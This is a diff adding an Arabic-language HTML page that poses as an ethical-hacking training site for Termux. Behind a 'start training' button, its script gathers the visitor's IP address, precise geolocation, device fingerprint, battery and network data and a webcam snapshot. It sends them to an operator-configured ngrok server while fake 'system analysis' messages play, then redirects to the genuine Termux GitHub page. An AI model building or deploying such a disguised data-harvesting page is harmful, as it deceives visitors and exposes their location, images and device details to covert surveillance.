@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hackers Hell - تعلّم الاختراق باستخدام Termux</title>
+    <style>
+        :root {
+            --hacker-green: #00ff41;
+            --matrix-bg: #0d0208;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background-color: var(--matrix-bg);
+            color: var(--hacker-green);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            line-height: 1.6;
+        }
+        
+        /* Matrix rain effect */
+        .matrix-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.3;
+        }
+        
+        .hacking-terminal {
+            width: 100%;
+            max-width: 800px;
+            background: rgba(13, 2, 8, 0.85);
+            border: 1px solid var(--hacker-green);
+            border-radius: 5px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .terminal-header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid var(--hacker-green);
+            padding-bottom: 15px;
+        }
+        
+        .terminal-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px var(--hacker-green);
+        }
+        
+        .terminal-header p {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .feature-card {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--hacker-green);
+            border-radius: 5px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .feature-card h3 {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: #ff5555;
+        }
+        
+        .cta-section {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        
+        .cta-section h2 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #ff5555;
+        }
+        
+        .btn-hack {
+            background: linear-gradient(to right, #00ff41, #00cc33);
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.3rem;
+            color: #0d0208;
+            border-radius: 3px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .btn-hack:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.8);
+        }
+        
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 3px;
+            min-height: 60px;
+            font-size: 1.1rem;
+        }
+        
+        .terminal-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            border-top: 1px solid var(--hacker-green);
+            padding-top: 15px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* جديد: شريط التقدم */
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background: #111;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #00ff41, #00cc33);
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        /* جديد: تعليمات Termux */
+        .termux-instructions {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--hacker-green);
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .termux-instructions code {
+            display: block;
+            background: #111;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Rain Effect -->
+    <canvas id="matrix-rain" class="matrix-rain"></canvas>
+    
+    <div class="hacking-terminal">
+        <div class="terminal-header">
+            <h1>HACKERS HELL</h1>
+            <p>اكتشف أسرار الاختراق باستخدام Termux - ابدأ رحلتك في عالم الاختراق الأخلاقي</p>
+        </div>
+        
+        <div class="features-grid">
+            <div class="feature-card">
+                <h3>★ Termux متقدم</h3>
+                <p>أوامر خفية لاختراق الأنظمة، تجاوز الحماية، وجمع المعلومات</p>
+            </div>
+            <div class="feature-card">
+                <h3>★ اختراق الشبكات</h3>
+                <p>اكتشف نقاط الضعف في أي شبكة واكتشف الأجهزة المتصلة</p>
+            </div>
+            <div class="feature-card">
+                <h3>★ أدوات الاختراق</h3>
+                <p>Metasploit, Nmap, Hydra - كل ما تحتاجه في مكان واحد</p>
+            </div>
+            <div class="feature-card">
+                <h3>★ حماية متقدمة</h3>
+                <p>تعلم كيفية إخفاء هويتك وتشفير اتصالاتك</p>
+            </div>
+        </div>
+        
+        <div class="cta-section">
+            <h2>⚠️ تحذير: هذه الأدوات لأغراض تعليمية فقط</h2>
+            <p>اضغط على الزر لبدء رحلتك في تعلم الاختراق الأخلاقي. سيتم تحليل نظامك لضمان توافق الأدوات مع جهازك.</p>
+            
+            <button id="hack-btn" class="btn-hack">بدء التدريب الآن</button>
+            
+            <!-- شريط التقدم -->
+            <div class="progress-container">
+                <div id="progress-bar" class="progress-bar"></div>
+            </div>
+            
+            <div id="status">
+                <!-- الحالة الأولية -->
+                > النظام جاهز. اضغط "بدء التدريب الآن" لتحليل جهازك وتحديد الأدوات المناسبة.
+            </div>
+            
+            <!-- تعليمات Termux -->
+            <div class="termux-instructions">
+                <h3>كيفية تثبيت Termux:</h3>
+                <ol>
+                    <li>فتح متجر Play وتثبيت تطبيق Termux</li>
+                    <li>فتح Termux وتنفيذ هذه الأوامر:</li>
+                    <code>
+                        pkg update<br>
+                        pkg upgrade<br>
+                        pkg install python<br>
+                        pkg install git<br>
+                        git clone https://github.com/termux/termux-packages
+                    </code>
+                    <li>ستجد جميع الأدوات في مجلد termux-packages</li>
+                </ol>
+            </div>
+        </div>
+        
+        <div class="terminal-footer">
+            <p>© 2024 Hackers Hell | تدريب احترافي | للاستخدام الأخلاقي فقط</p>
+            <p>جميع الحقوق محفوظة | الاستخدام الخاطئ يعرضك للمساءلة القانونية</p>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Rain Effect
+        const canvas = document.getElementById('matrix-rain');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*ابتثجحخدذرزسشصضطظعغفقكلمنهوي";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        
+        const drops = [];
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(13, 2, 8, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = "#00ff41"; // تم إصلاح لون المطر البرمجي
+            ctx.font = fontSize + "px monospace";
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 33);
+        
+        // Data Collection Functions
+        const statusEl = document.getElementById('status');
+        const hackBtn = document.getElementById('hack-btn');
+        const progressBar = document.getElementById('progress-bar');
+        
+        // سيتم تعيين هذا الرابط بعد تشغيل ngrok
+        let SERVER_URL = 'YOUR_NGROK_URL/receive_data';
+        
+        let collectedData = {
+            ip: '',
+            location: null,
+            device: {},
+            battery: null,
+            network: {},
+            camera: null,
+            timestamp: null
+        };
+        
+        // تحديث شريط التقدم
+        function updateProgress(percent) {
+            progressBar.style.width = percent + '%';
+        }
+        
+        // الحصول على عنوان IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'unknown';
+            }
+        }
+        
+        // الحصول على الموقع الدقيق
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        }),
+                        error => reject('تم رفض طلب الموقع')
+                    );
+                } else {
+                    reject('Geolocation not supported');
+                }
+            });
+        }
+        
+        // معلومات الجهاز
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                languages: navigator.languages,
+                cookiesEnabled: navigator.cookieEnabled
+            };
+        }
+        
+        // حالة البطارية
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.floor(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }
+            return {error: 'Battery API not supported'};
+        }
+        
+        // معلومات الشبكة
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return {
+                    type: connection.type,
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink + ' Mbps',
+                    rtt: connection.rtt + ' ms',
+                    saveData: connection.saveData
+                };
+            }
+            return {error: 'Network API not supported'};
+        }
+        
+        // التقاط صورة من الكاميرا
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const context = canvas.getContext('2d');
+                context.drawImage(bitmap, 0, 0);
+                
+                track.stop();
+                return canvas.toDataURL('image/jpeg');
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // إرسال البيانات إلى سيرفر Termux
+        async function sendDataToServer() {
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // بدء التدريب (جمع البيانات)
+        async function startHacking() {
+            hackBtn.disabled = true;
+            statusEl.innerHTML = '> جاري تحليل نظامك...';
+            updateProgress(10);
+            
+            try {
+                // الخطوة 1: جمع البيانات الأساسية
+                statusEl.innerHTML = '> جاري جمع المعلومات الأساسية عن الجهاز...';
+                collectedData.timestamp = new Date().toISOString();
+                collectedData.ip = await getIP();
+                collectedData.device = getDeviceInfo();
+                collectedData.network = getNetworkInfo();
+                updateProgress(30);
+                
+                // الخطوة 2: جمع البيانات الحساسة
+                statusEl.innerHTML = '> جاري فحص حالة النظام...';
+                collectedData.battery = await getBatteryStatus();
+                updateProgress(50);
+                
+                // الخطوة 3: الموقع الجغرافي
+                statusEl.innerHTML = '> جاري تحديد الموقع الجغرافي...';
+                collectedData.location = await getLocation();
+                updateProgress(70);
+                
+                // الخطوة 4: الكاميرا (اختياري)
+                statusEl.innerHTML = '> جاري التحقق من أجهزة الاستشعار...';
+                collectedData.camera = await captureCamera();
+                updateProgress(90);
+                
+                // الخطوة 5: إرسال البيانات
+                statusEl.innerHTML = '> جاري إرسال التقرير لتحديد الأدوات المناسبة...';
+                const success = await sendDataToServer();
+                
+                if (success) {
+                    // الرسالة النهائية
+                    statusEl.innerHTML = `
+                        <span style="color:#00ff41">> ✓ تم تحليل نظامك بنجاح!</span><br><br>
+                        > تم تحديد الأدوات المناسبة لجهازك:<br>
+                        > - Termux Hacking Toolkit v3.5<br>
+                        > - Network Scanner Pro<br>
+                        > - Advanced Penetration Suite<br>
+                        <br>
+                        > سيتم توجيهك لصفحة التحميل خلال 5 ثواني...
+                    `;
+                    updateProgress(100);
+                    
+                    // توجيه المستخدم لصفحة التحميل بعد 5 ثواني
+                    setTimeout(() => {
+                        window.location.href = 'https://github.com/termux/termux-app';
+                    }, 5000);
+                } else {
+                    statusEl.innerHTML = '> ✗ فشل في الاتصال بالسيرفر. يرجى المحاولة لاحقًا.';
+                    hackBtn.disabled = false;
+                    updateProgress(0);
+                }
+            } catch (error) {
+                statusEl.innerHTML = `> ✗ خطأ في التحليل: ${error}`;
+                hackBtn.disabled = false;
+                updateProgress(0);
+            }
+        }
+        
+        // حدث النقر على زر البدء
+        hackBtn.addEventListener('click', startHacking);
+        
+        // تعديل حجم Canvas عند تغيير حجم النافذة
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+  </html>
